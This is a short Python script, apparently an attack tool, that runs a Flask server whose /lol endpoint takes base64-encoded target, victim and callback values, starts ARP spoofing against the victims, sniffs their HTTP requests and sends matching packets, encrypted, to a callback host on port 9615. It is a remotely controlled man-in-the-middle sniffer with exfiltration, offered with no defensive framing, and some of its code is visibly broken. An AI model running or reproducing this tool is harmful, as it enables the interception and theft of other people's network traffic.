import base64
from multiprocessing import Process,freeze_support
import flask
from flask import request
import scapy
import requests
from scapy.layers import http
from itsdangerous import base64_decode
import arpspoof
from cryptography.fernet import Fernet
app = flask.Flask(__name__)
key = base64.b64encode(b"plshelpplshelpplshelpplshelppppp")

f = Fernet(key)
def process_packets(packet):
    try:
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print(packet)
            if "lol" in url:
                print(packet)
                requests.get(f"http://{callback}:9615/slol?d={base64.b64encode(f.encrypt(packet))}")
    except:
        pass

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


@app.route('/lol')
def lol():
    ahost = request.args.get('a')
    bvictims = request.args.get('b')
    ccallback = request.args.get('c')
    global callback 
    try:
        host = base64.b64decode(ahost)
        victims = base64.b64decode(bvictims)
        callback = base64.b64decode(ccallback)
    except:
        host = request.args.get('a')
        victims = request.args.get('b')
        callback = request.args.get('c')
    p = Process(target=arpspoof.run(host,victims,process_packets))
    p.start()
    return "lol"
app.run(port=6915)